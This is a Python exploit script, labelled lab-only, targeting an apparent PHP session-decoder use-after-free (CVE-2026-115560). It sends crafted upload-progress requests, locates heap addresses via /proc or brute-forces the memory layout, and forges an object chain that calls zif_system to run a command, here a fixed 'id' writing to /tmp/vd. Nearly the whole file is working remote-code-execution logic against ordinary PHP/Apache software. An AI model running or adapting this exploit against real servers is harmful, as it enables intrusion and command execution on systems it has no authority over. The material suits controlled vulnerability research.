#!/usr/bin/env python3
"""LAB-ONLY CVE-2026-115560 -> var_destroy -> zif_system.

The upload-progress hook writes the session file under the configured
php_serialize handler; the app then switches to the "php" handler and calls
session_start(). The "php" decoder splits at the first "|" in the progress
value, so the bytes after it are attacker-controlled and are fed to
php_var_unserialize() during session_start() -- no application unserialize()
sink is needed.

The payload is the proven var_destroy array with a CachePurge dtor object. The
carrier lives inside the session value string (the bytes after "|"); the dtor
sprays and re-enters unserialize('R:1020;'). The forged zend_reference ->
zend_object -> dtor_obj=zif_system executes the fixed benign command.

Modes:
  measure  -- dtor records its pid and sleeps; host scans /proc/<pid>/mem for
              the carrier address and measures main -> value-string delta.
  fire     -- dtor sprays and fires the forged chain.
  run      -- measure, reset the worker, then fire.

Lab-only; fixed benign command "id>/tmp/vd 2>&1"; no arbitrary commands.
"""
import argparse
import importlib.util
import os
import re
import secrets
import socket
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


PC = _load("vdpost", os.path.join(_HERE, "verify_vardestroy_postcarrier.py"))
MAGIC = PC.MAGIC
MOFF = PC.MOFF
DOFF = PC.DOFF
OFF_ZVAL = PC.OFF_ZVAL


def force_fail(payload):
    """Append an invalid token before the array's closing brace.

    The php session decoder ignores the serializer's trailing wrapper junk in
    some builds, so the decode can succeed and only the dry mid-parse dtor
    fires. An invalid byte *inside* the array forces a decode failure after the
    CachePurge object has been parsed and its dtor registered, making the
    failure var_destroy dtor (where the UAF lives) deterministic.
    """
    if payload.endswith(b"}"):
        return payload[:-1] + b"Z}"
    return payload


def sh(container, cmd, timeout=90):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


def shb(container, cmd, timeout=90):
    """Binary-safe exec (session files contain nulls)."""
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, timeout=timeout)


def worker_pid(container):
    r = sh(container, "for p in /proc/[0-9]*; do c=$(cat $p/comm 2>/dev/null); "
                      "[ \"$c\" = apache2 ] && echo ${p#/proc/}; done | sort -n | tail -1")
    pid = r.stdout.strip()
    return int(pid) if pid else 0


def http_upload(host, port, path, value, sid, timeout=45):
    """POST the var_destroy payload as the upload-progress VALUE.

    The value is binary-safe (multipart body, not a header), so the carrier
    blob's nulls survive. The leading "|" is what the "php" decoder splits on.
    """
    bnd = b"----115560lab"
    body = (b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"|" + value + b"\r\n"
            b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="x.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\n"
            b"Z\r\n--" + bnd + b"--\r\n")
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def readelf_zif(container, lib_base):
    r = sh(container, "readelf -sW /usr/lib/apache2/modules/libphp.so "
                      "| grep -E ' zif_system$' | head -1")
    for line in r.stdout.splitlines():
        parts = line.split()
        if parts and parts[-1] == "zif_system":
            return lib_base + int(parts[1], 16)
    return 0


def prime(host, port, container, sid):
    """Write one valid dummy progress record for `sid` via /prime.php.

    The dummy payload is a valid a:1018 array (key=0), so the php decoder's
    record loop proceeds past it. The exploit/measure request then appends the
    real record: 8.4.27's UAF dtor only appears on the second record.
    """
    dummy = PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00")
    try:
        http_upload(host, port, "/prime.php", dummy, sid, timeout=20)
    except OSError:
        pass


def measure(host, port, container, sid, build, measure_mode="0"):
    """Return (main, delta, lib, zif, carrier) for the session-value string."""
    sh(container, "rm -f /tmp/meas_pid /tmp/vd")
    # zero fill keeps the 8 bytes before the magic zero.
    val = bytearray(PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00"))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = force_fail(bytes(val))

    prime(host, port, container, sid)
    th = {}
    t = threading.Thread(target=lambda: th.setdefault(
        "r", http_upload(host, port, f"/index.php?m={measure_mode}", payload, sid)),
        daemon=True)
    t.start()

    pid = 0
    for _ in range(80):
        pid = int(sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[!] measure dtor did not run (no /tmp/meas_pid)")
        return None

    maps_text = sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib or not mains:
        print(f"[!] maps parse failed (lib={lib} mains={mains})")
        return None
    main = mains[0]
    zif = readelf_zif(container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        return None

    # Two buffers contain the magic: the persistent raw session input buffer
    # (after "|") and the s:4096 zend_string copy. The copy is freed at the
    # first duplicate i:0, long before the CachePurge dtor fires, so the
    # carrier must be the raw input buffer. Identify it by the serialized
    # array prefix immediately before the blob.
    scan = sh(container, f"php /var/www/html/scan_prefix.php {pid} "
                         f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PC.PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        hits.append((h, v, pref))
    if not hits:
        print(f"[!] magic scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        return None
    want = PC.PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)}")
    if raw:
        magic_addr, value_string, _ = raw[0]
    else:
        magic_addr, value_string, _ = hits[0]
        print("[!] no hit carried the raw-input PREFIX; using first hit")
    carrier = value_string + DOFF
    delta = value_string - main

    print(f"[m] pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] magic={magic_addr:#x} carrier={carrier:#x} "
          f"value_string={value_string:#x} delta={delta:#x}")

    # release the sleeping measure request
    sh(container, f"kill -9 {pid} 2>/dev/null")
    t.join(timeout=5)
    time.sleep(0.8)
    return main, delta, lib, zif, carrier


def fire(host, port, container, sid, main, delta, zif, bias=0, proof="/tmp/vd",
         fire_mode="4", path="/index.php", ref=1020, spray=3048):
    carrier = main + delta + DOFF
    key = (carrier + OFF_ZVAL).to_bytes(8, "little")
    payload = force_fail(PC.build_value(carrier, zif + bias, key,
                                        blob_fill=b"\x00"))
    sh(container, f"rm -f {proof} /tmp/meas_pid")
    prime(host, port, container, sid)
    resp = http_upload(host, port,
                       f"{path}?m={fire_mode}&r={ref}&s={spray}", payload, sid)
    time.sleep(0.8)
    out = sh(container, f"cat {proof} 2>/dev/null").stdout
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[f] response={status} proof={out.strip()!r}")
    return "uid=" in out


def brute(host, port, container, sid, delta, lib_delta, zif_off, fire_mode,
          lo, hi, step, max_attempts, proof="/tmp/vd", ref=1020, spray=3048):
    """No-/proc final: scan the 2 MiB-aligned ZendMM main window.

    For each candidate main chunk, carrier = main + delta + DOFF and
    zif = main + lib_delta + zif_off. A wrong guess only kills a child; the
    parent respawns with the same fork-inherited address space.
    """
    sh(container, f"rm -f {proof}")
    n = 0
    t0 = time.time()
    mm = lo
    while mm < hi:
        carrier = mm + delta + DOFF
        zif = mm + lib_delta + zif_off
        key = (carrier + OFF_ZVAL).to_bytes(8, "little")
        payload = force_fail(PC.build_value(carrier, zif, key,
                                            blob_fill=b"\x00"))
        # Fresh SID per guess: the upload-progress hook otherwise appends to a
        # reused session file, which grows it and drifts the carrier delta
        # (and, on 8.4.27, removes the real decode-failure dtor).
        attempt_sid = sid if sid else secrets.token_hex(16)
        prime(host, port, container, attempt_sid)
        try:
            http_upload(host, port,
                        f"/index.php?m={fire_mode}&r={ref}&s={spray}", payload,
                        attempt_sid, timeout=20)
        except OSError:
            pass
        n += 1
        out = sh(container, f"cat {proof} 2>/dev/null").stdout
        if "uid=" in out:
            print(f"[EVIDENCE] brute-force FOUND after {n} attempts "
                  f"({time.time()-t0:.1f}s): main={mm:#x} carrier={carrier:#x} "
                  f"zif={zif:#x}\n{out.strip()}")
            return 0
        if max_attempts and n >= max_attempts:
            print(f"[!] stopped at --max-attempts={n}")
            return 1
        if n % 25 == 0:
            el = time.time() - t0
            print(f"    {n} attempts {n / el:.1f}/s main={mm:#x}", flush=True)
        mm += step
    print(f"[!] exhausted after {n} attempts")
    return 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18200")
    ap.add_argument("--container", default="php2shell-115560-8427")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--sid", default=None,
                    help="fixed session id (debug only; default: fresh per "
                         "request so the session file cannot accumulate)")
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="shift zif_system (control: non-zero must NOT fire)")
    ap.add_argument("--path", default="/index.php",
                    help="consumer endpoint (use /noswitch.php for the control)")
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--measure-mode", default="5", choices=["0", "2", "5"],
                    help="5=skip dry dtor and hold at the real var_destroy dtor "
                         "(default; matches fire). 0/2 are diagnostics.")
    ap.add_argument("--fire-mode", default="4", choices=["1", "4"],
                    help="4=skip the dry mid-parse dtor and fire on the "
                         "decode-failure var_destroy dtor (default). 1 fires on "
                         "every dtor (diagnostic; uses the stale first delta).")
    ap.add_argument("--main", type=lambda x: int(x, 0), default=None,
                    help="skip measure: ZendMM main chunk base")
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None,
                    help="skip measure: value-string delta from main")
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None,
                    help="skip measure: libphp base")
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None,
                    help="skip measure: zif_system address")
    ap.add_argument("--brute", action="store_true",
                    help="no-/proc final: scan the 2 MiB-aligned main window")
    ap.add_argument("--lib-delta", type=lambda x: int(x, 0), default=None,
                    help="calibrated libphp_base - main (brute mode)")
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=None,
                    help="calibrated zif_system symbol offset (brute mode)")
    ap.add_argument("--lo", type=lambda x: int(x, 0), default=0xFFFF78000000)
    ap.add_argument("--hi", type=lambda x: int(x, 0), default=0xFFFFC0000000)
    ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200000)
    ap.add_argument("--max-attempts", type=int, default=0)
    ap.add_argument("--ref", type=int, default=1020,
                    help="R: reference id for the re-entry (default 1020)")
    ap.add_argument("--spray", type=int, default=None,
                    help="spray string length; default 3048 on 8.4.x "
                         "(1 page -> key at var_entries->data[1]) and 8135 on "
                         "8.5.x")
    ap.add_argument("mode", nargs="?", default="run",
                    choices=["measure", "fire", "run"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    spray = args.spray if args.spray is not None else (
        8135 if args.build.startswith("8.5") else 3048)
    print(f"[*] 115560 -> var_destroy -> zif_system ({args.build})")
    print(f"    target {args.target} container {args.container} path {args.path}")

    if args.brute:
        if args.delta is None or args.lib_delta is None or args.zif_off is None:
            print("[!] --brute needs --delta, --lib-delta and --zif-off")
            return 2
        return brute(host, port, args.container, args.sid, args.delta,
                     args.lib_delta, args.zif_off, args.fire_mode,
                     args.lo, args.hi, args.step, args.max_attempts,
                     args.proof, args.ref, spray)

    main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
    fire_mode = args.fire_mode
    if args.mode in ("measure", "run"):
        res = measure(host, port, args.container,
                      args.sid or secrets.token_hex(16), args.build,
                      args.measure_mode)
        if not res and args.measure_mode == "5" and args.fire_mode == "4":
            # 8.5.x destroys the object once (mid-parse); there is no second
            # decode-failure dtor to hold at. Measure that single dtor and
            # fire on it.
            print("[i] no second var_destroy dtor (8.5.x shape); "
                  "falling back to the single mid-parse dtor")
            res = measure(host, port, args.container,
                          args.sid or secrets.token_hex(16), args.build, "0")
            fire_mode = "1"
        if not res:
            return 2
        main_addr, delta, lib, zif, _carrier = res

    if args.mode == "measure":
        return 0

    if main_addr is None or delta is None:
        print("[!] fire needs --main and --delta (or 'run' to measure)")
        return 2
    if not zif:
        if not lib:
            print("[!] fire needs --zif or --lib")
            return 2
        zif = readelf_zif(args.container, lib)
        if not zif:
            print("[!] zif_system symbol not found")
            return 2

    if args.bias_zif:
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")
    if fire(host, port, args.container,
            args.sid or secrets.token_hex(16), main_addr, delta, zif,
            args.bias_zif, args.proof, fire_mode, args.path, args.ref, spray):
        print("[EVIDENCE] 115560 session decode -> var_destroy -> uid=33")
        return 0
    print("[!] no proof written")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
